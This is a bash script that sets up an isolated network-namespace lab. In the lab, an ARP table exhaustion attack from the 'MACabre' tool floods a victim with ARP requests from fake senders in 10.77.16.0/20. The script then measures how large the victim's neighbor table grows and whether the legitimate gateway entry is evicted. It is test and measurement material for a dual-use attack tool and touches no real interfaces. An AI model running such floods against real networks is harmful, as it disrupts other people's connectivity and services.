#!/usr/bin/env bash
# Isolated ARP table exhaustion lab (Linux only, needs root).
#
# Topology, all inside network namespaces:
#
#   victim   --(veth)-- [switch: bridge br0, port p-vic]   10.77.0.10
#   gateway  --(veth)-- [switch: bridge br0, port p-gw ]   10.77.0.1, a legitimate neighbor
#   attacker --(veth)-- [switch: bridge br0, port p-att]   MACabre's ARP table exhaustion sender
#
#   attacker: sends ARP requests for the victim's address from fake senders in 10.77.16.0/20.
#
# The limit of the victim's neighbor table is not set or read here. Some kernels, including the
# OrbStack VM kernel, do not expose net.ipv4.neigh.default.gc_thresh3. Instead, the lab measures the
# limit the kernel enforces:
#
#   Phase 0 (baseline): the victim pings the gateway, so it holds a legitimate entry for it.
#   Phase 1 (exhaustion): the attacker sends ROUND_FRAMES requests per round. After each round the
#                         lab counts the victim's entries. When the count stops growing for two rounds
#                         in a row, that count is the observed limit of the table.
#
# Result: the observed limit, how many fake entries it took to reach it, and whether the gateway's
# entry survived. Other systems use other limits and eviction rules; test the target device.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/arp_table_exhaustion_lab.sh
#   sudo ROUND_FRAMES=100 MAX_ROUNDS=40 scripts/lab/arp_table_exhaustion_lab.sh
#
# Exit 0 when the table stops growing and fake entries were learned. Exit 2 when it does not stop
# growing within MAX_ROUNDS (inconclusive). Exit 1 when the setup or the baseline did not match.
#
# Requirements: iproute2 (ip, bridge) and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge ping; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
ROUND_FRAMES="${ROUND_FRAMES:-200}"
MAX_ROUNDS="${MAX_ROUNDS:-30}"
VICTIM_IP="10.77.0.10"
GATEWAY_IP="10.77.0.1"
SENDER_SUBNET="10.77.16.0/20"
VICTIM_MAC="02:00:00:00:00:10"
GATEWAY_MAC="02:00:00:00:00:01"
ATTACKER_MAC="02:00:00:00:00:30"
WORK="$(mktemp -d)"
chmod 755 "$WORK"

stop_lab() {
    for ns in victim gateway attacker switch; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add switch
ip netns add victim
ip netns add gateway
ip netns add attacker

for spec in "vic|victim|$VICTIM_MAC|$VICTIM_IP/16" "gw|gateway|$GATEWAY_MAC|$GATEWAY_IP/16" "att|attacker|$ATTACKER_MAC|"; do
    name="$(echo "$spec" | cut -d'|' -f1)"
    ns="$(echo "$spec" | cut -d'|' -f2)"
    mac="$(echo "$spec" | cut -d'|' -f3)"
    addr="$(echo "$spec" | cut -d'|' -f4)"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns switch
    ip netns exec "$ns" ip link set "h-$name" address "$mac"
    ip netns exec "$ns" ip link set "h-$name" up
    if [[ -n "$addr" ]]; then
        ip netns exec "$ns" ip addr add "$addr" dev "h-$name"
    fi
    ip netns exec switch ip link set "p-$name" up
done

ip netns exec switch ip link add br0 type bridge
ip netns exec switch ip link set br0 up
for name in vic gw att; do
    ip netns exec switch ip link set "p-$name" master br0
done

# Sends ROUND_FRAMES requests for the victim's address, from new fake senders in SENDER_SUBNET.
SEND_CODE='
import os, threading
from macabre.attacks.arp_table_exhaustion import ArpTableExhaustionConfig, run_arp_table_exhaustion
run_arp_table_exhaustion(
    ArpTableExhaustionConfig(iface="h-att", victim_ip=os.environ["VICTIM_IP"], subnet=os.environ["SENDER_SUBNET"],
                             rate=100, count=int(os.environ["ROUND_FRAMES"])),
    threading.Event(),
    lambda _s: None,
)
'

# Entries in the victim's neighbor table, and entries in the fake sender subnet.
entries() {
    ip netns exec victim ip -4 neigh show | grep -c . || true
}
fake_entries() {
    ip netns exec victim ip -4 neigh show | awk '$1 ~ /^10\.77\.(1[6-9]|2[0-9]|3[01])\./' | grep -c . || true
}
gateway_entry() {
    ip netns exec victim ip -4 neigh show "$GATEWAY_IP" | grep -c . || true
}

echo "Phase 0: baseline, the victim pings the gateway"
ip netns exec victim ping -c 2 -W 1 "$GATEWAY_IP" >/dev/null 2>&1 || true
BASE_ENTRIES="$(entries)"
BASE_GATEWAY="$(gateway_entry)"
echo "  entries in the victim's neighbor table: $BASE_ENTRIES"
echo "  gateway entry present: $([[ "$BASE_GATEWAY" -gt 0 ]] && echo yes || echo no)"
echo

echo "Phase 1: exhaustion, $ROUND_FRAMES requests per round for $VICTIM_IP from new senders in $SENDER_SUBNET"
prev=-1
same=0
observed=0
plateau=0
rounds=0
for round in $(seq 1 "$MAX_ROUNDS"); do
    rounds=$round
    ip netns exec attacker env PYTHONPATH="$ROOT/src" VICTIM_IP="$VICTIM_IP" SENDER_SUBNET="$SENDER_SUBNET" \
        ROUND_FRAMES="$ROUND_FRAMES" "$PY" -c "$SEND_CODE" >/dev/null 2>&1
    sleep 1
    cur="$(entries)"
    echo "  round $round: $((round * ROUND_FRAMES)) requests sent, $cur entries in the victim's table"
    if (( cur > observed )); then observed=$cur; fi
    if (( round > 1 && cur <= prev )); then same=$((same + 1)); else same=0; fi
    prev=$cur
    if (( same >= 2 )); then plateau=1; break; fi
done
echo

AFTER_FAKE="$(fake_entries)"
AFTER_GATEWAY="$(gateway_entry)"
SENT=$((rounds * ROUND_FRAMES))
echo "  observed limit (entries when the table stopped growing): $observed"
echo "  requests sent until then: $SENT"
echo "  fake sender entries learned: $AFTER_FAKE"
echo "  gateway entry present: $([[ "$AFTER_GATEWAY" -gt 0 ]] && echo yes || echo no)"
echo

if [[ "$BASE_GATEWAY" -gt 0 && "$AFTER_FAKE" -gt 0 && "$observed" -gt "$BASE_ENTRIES" ]]; then
    if (( plateau )); then
        if [[ "$AFTER_GATEWAY" -gt 0 ]]; then
            GW_NOTE="The gateway's entry survived the flood."
        else
            GW_NOTE="The gateway's entry was evicted by the flood."
        fi
        echo "Result: the victim's table stopped growing at $observed entries after $SENT requests from new senders, and it learned $AFTER_FAKE fake entries. $GW_NOTE Other systems use other limits and eviction rules; test the target device."
        exit 0
    fi
    echo "Result: inconclusive. The table was still growing after $SENT requests (observed $observed entries), so no limit was reached within MAX_ROUNDS=$MAX_ROUNDS."
    exit 2
fi
echo "Result: the outcome did not match the expected phases. Result unreliable."
exit 1
